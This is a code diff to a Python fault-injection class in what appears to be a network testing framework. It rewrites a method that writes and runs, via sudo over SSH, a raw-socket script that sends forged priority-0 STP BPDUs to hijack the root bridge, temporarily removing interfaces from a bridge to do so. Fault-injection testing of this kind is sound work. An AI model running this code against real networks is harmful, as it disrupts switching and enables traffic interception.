@@ -7,7 +7,10 @@ import logging
 from typing import Optional, List, Dict
 from enum import Enum
 
-from .ssh_manager import SSHManager
+try:
+    from .ssh_manager import SSHManager
+except ImportError:
+    from ssh_manager import SSHManager
 
 
 class FaultType(Enum):
@@ -168,58 +171,183 @@ class FaultInjector:
         return True
 
     def inject_rogue_bpdu(self, interface: str, priority: int = 0,
-                          src_mac: str = "00:11:22:33:44:55",
-                          count: int = 10, interval: float = 2.0) -> bool:
-        """注入恶意BPDU"""
-        self.logger.warning(f"注入恶意BPDU到 {interface}")
-
-        # 创建scapy脚本
-        script = f"""
-#!/usr/bin/env python3
-from scapy.all import *
-import time
-
-for i in range({count}):
-    # 构建BPDU包
-    eth = Ether(dst="01:80:c2:00:00:00", src="{src_mac}")
-    llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
-
-    # STP BPDU
-    bpdu = STP(
-        bpdutype=0x00,
-        bpduflags=0x01,
-        rootid={priority},
-        rootmac="{src_mac}",
-        pathcost=0,
-        bridgeid={priority},
-        bridgemac="{src_mac}",
-        portid=0x8001
-    )
-
-    # 发送包
-    packet = eth/llc/bpdu
-    sendp(packet, iface="{interface}", verbose=0)
-    print(f"发送恶意BPDU #{{i+1}}")
-    time.sleep({interval})
-
-print("恶意BPDU注入完成")
-"""
-
-        # 写入临时文件
-        script_path = "/tmp/rogue_bpdu.py"
-        self.node.execute(f"echo '{script}' > {script_path}")
-        self.node.execute(f"chmod +x {script_path}")
-
-        # 后台执行
-        stdout, stderr, code = self.node.execute_sudo(
-            f"nohup python3 {script_path} > /tmp/rogue_bpdu.log 2>&1 &"
-        )
-
-        if code == 0:
-            self.logger.warning(f"恶意BPDU注入已启动 (优先级: {priority})")
+                        src_mac: str = "00:11:22:33:44:55",
+                        count: int = 10, interval: float = 2.0) -> bool:
+        """注入恶意BPDU - 增强版直接物理层注入"""
+        self.logger.warning(f"注入恶意BPDU到 {interface}，优先级: {priority}")
+        
+        # 检查接口是否在网桥中
+        bridge_check_cmd = "brctl show"
+        stdout, stderr, code = self.node.execute(bridge_check_cmd)
+        self.logger.info(f"网桥状态检查: {(stdout, stderr, code)}")
+        
+        # 尝试多个接口发送BPDU
+        interfaces_to_try = [interface]
+        if interface == "eth2":
+            # 如果eth2在网桥中或无法直接到达DUT，尝试其他接口
+            interfaces_to_try = ["eth2", "eth0", "eth1"]
+        
+        success_count = 0
+        total_attempts = 0
+        
+        for iface in interfaces_to_try:
+            self.logger.info(f"尝试通过接口 {iface} 发送BPDU")
+            
+            # 检查接口状态
+            iface_check_cmd = f"ip link show {iface}"
+            iface_stdout, _, iface_code = self.node.execute(iface_check_cmd)
+            if iface_code != 0:
+                self.logger.warning(f"接口 {iface} 不存在，跳过")
+                continue
+                
+            if "UP" not in iface_stdout:
+                self.logger.warning(f"接口 {iface} 未启用，跳过")
+                continue
+            
+            # 检查此接口是否在网桥中
+            iface_in_bridge = iface in stdout
+            
+            if iface_in_bridge:
+                self.logger.info(f"接口 {iface} 在网桥中，临时移除")
+                # 临时移除接口
+                remove_cmd = f"brctl delif br0 {iface}"
+                self.node.execute_sudo(remove_cmd)
+                time.sleep(1)
+            else:
+                self.logger.info(f"接口 {iface} 不在任何网桥中")
+        
+            # 创建Python脚本内容
+            script_lines = [
+                '#!/usr/bin/env python3',
+                '# -*- coding: utf-8 -*-',
+                '',
+                'import socket',
+                'import struct', 
+                'import time',
+                'import sys',
+                '',
+                f'interface = "{iface}"',
+                f'priority = {priority}',
+                f'src_mac = "{src_mac}"',
+                f'count = {count}',
+                f'interval = {interval}',
+                'success_count = 0',
+                '',
+                'print("=== 恶意BPDU注入器 (增强版) ===")',
+                'print(f"接口: {interface}")',
+                'print(f"优先级: {priority}")',
+                'print(f"源MAC: {src_mac}")',
+                'print(f"数量: {count}, 间隔: {interval}s")',
+                '',
+                'def build_bpdu_frame():',
+                '    dst_mac = bytes.fromhex("01:80:C2:00:00:00".replace(":", ""))',
+                '    src_mac_bytes = bytes.fromhex(src_mac.replace(":", ""))',
+                '    length = struct.pack(">H", 38)',
+                '    llc = struct.pack(">BBB", 0x42, 0x42, 0x03)',
+                '    protocol_id = struct.pack(">H", 0x0000)',
+                '    version = struct.pack(">B", 0x02)',
+                '    bpdu_type = struct.pack(">B", 0x02)',
+                '    flags = struct.pack(">B", 0x3C)',
+                '    bridge_id = struct.pack(">H", priority) + src_mac_bytes',
+                '    root_id = bridge_id',
+                '    root_path_cost = struct.pack(">I", 0)',
+                '    port_id = struct.pack(">H", 0x8001)',
+                '    message_age = struct.pack(">H", 0)',
+                '    max_age = struct.pack(">H", 20 << 8)',
+                '    hello_time = struct.pack(">H", 2 << 8)',
+                '    forward_delay = struct.pack(">H", 15 << 8)',
+                '    frame = (dst_mac + src_mac_bytes + length + llc +',
+                '             protocol_id + version + bpdu_type + flags +',
+                '             root_id + root_path_cost + bridge_id + port_id +',
+                '             message_age + max_age + hello_time + forward_delay)',
+                '    return frame',
+                '',
+                'def send_via_raw_socket():',
+                '    global success_count',
+                '    print("\\n=== 方法1: RAW Socket发送 ===")',
+                '    try:',
+                '        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)',
+                '        sock.bind((interface, 0))',
+                '        frame = build_bpdu_frame()',
+                '        for i in range(count):',
+                '            try:',
+                '                sock.send(frame)',
+                '                print(f"RAW Socket发送BPDU #{i+1}")',
+                '                success_count += 1',
+                '                if i < count - 1:',
+                '                    time.sleep(interval)',
+                '            except Exception as e:',
+                '                print(f"RAW Socket发送失败 #{i+1}: {e}")',
+                '        sock.close()',
+                '        print(f"RAW Socket方法完成: {success_count}/{count}")',
+                '        return success_count > 0',
+                '    except Exception as e:',
+                '        print(f"RAW Socket方法失败: {e}")',
+                '        return False',
+                '',
+                'try:',
+                '    print("\\n开始BPDU注入...")',
+                '    if send_via_raw_socket():',
+                '        print("\\n✓ RAW Socket方法成功")',
+                '    else:',
+                '        print("\\n✗ RAW Socket方法失败")',
+                '    print(f"\\n=== 注入结果 ===")',
+                '    print(f"总共发送: {success_count}/{count} 个BPDU")',
+                '    print(f"目标: 劫持根桥 (优先级 {priority})")',
+                '    if success_count > 0:',
+                '        print("\\n✓ BPDU注入成功完成")',
+                '        sys.exit(0)',
+                '    else:',
+                '        print("\\n✗ BPDU注入失败")',
+                '        sys.exit(1)',
+                'except KeyboardInterrupt:',
+                '    print("\\n用户中断")',
+                '    sys.exit(1)',
+                'except Exception as e:',
+                '    print(f"\\n严重错误: {e}")',
+                '    sys.exit(1)'
+            ]
+            script = '\n'.join(script_lines)
+            
+            # 写入并执行脚本
+            script_path = f"/tmp/rogue_bpdu_{iface}.py"
+            # 使用cat命令写入脚本，避免引号冲突
+            write_cmd = f"cat > {script_path} << 'EOF'\n{script}\nEOF"
+            self.node.execute(write_cmd)
+            self.node.execute(f"chmod +x {script_path}")
+            
+            # 使用sudo执行以获得raw socket权限
+            stdout, stderr, code = self.node.execute_sudo(f"python3 {script_path}")
+            
+            self.logger.info(f"接口 {iface} BPDU注入脚本执行结果 (code={code}):")
+            if stdout:
+                self.logger.info(f"STDOUT: {stdout}")
+            if stderr and code != 0:
+                self.logger.warning(f"STDERR: {stderr}")
+            
+            total_attempts += 1
+            
+            if code == 0 or "成功发送" in str(stdout):
+                success_count += 1
+                self.logger.warning(f"接口 {iface} 恶意BPDU注入成功 (优先级: {priority})")
+            else:
+                self.logger.error(f"接口 {iface} 恶意BPDU注入失败")
+            
+            # 恢复接口到网桥（如果之前移除了）
+            if iface_in_bridge:
+                self.logger.info(f"恢复接口 {iface} 到网桥")
+                restore_cmd = f"brctl addif br0 {iface}"
+                self.node.execute_sudo(restore_cmd)
+                time.sleep(0.5)
+        
+        # 输出最终结果
+        self.logger.info(f"BPDU注入总结: {success_count}/{total_attempts} 个接口成功")
+        
+        if success_count > 0:
+            self.logger.warning(f"恶意BPDU注入完成 - 成功接口数: {success_count}")
             return True
         else:
-            self.logger.error(f"无法注入恶意BPDU: {stderr}")
+            self.logger.error(f"所有接口的BPDU注入均失败")
             return False
 
     def clear_all_faults(self) -> None:
